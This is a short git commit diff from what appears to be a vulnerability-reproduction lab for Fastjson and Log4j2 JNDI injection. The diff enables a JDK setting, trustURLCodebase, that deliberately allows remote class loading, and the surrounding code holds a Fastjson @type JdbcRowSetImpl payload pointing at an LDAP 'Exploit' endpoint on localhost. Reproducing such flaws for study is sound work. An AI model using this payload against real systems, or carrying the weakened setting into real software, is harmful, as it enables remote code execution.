692979e414913b3209c9400ea383ab3e2fcc1895
yan.huang <yan.huang@jrj.com.cn>
2021-12-11 11:51:15 +0800

    log4j2漏洞

--- src/main/java/cn/eovie/victim/SomeFastjsonApp.java
+++ src/main/java/cn/eovie/victim/SomeFastjsonApp.java
@@ -13,7 +13,7 @@ public class SomeFastjsonApp {
 
     public static void testJdbcRowSetImpl(){
         //JDK 8u121以后版本需要设置改系统变量
-        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
         //LADP 方式
         String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," + " \"autoCommit\":true}";
         //RMI 方式
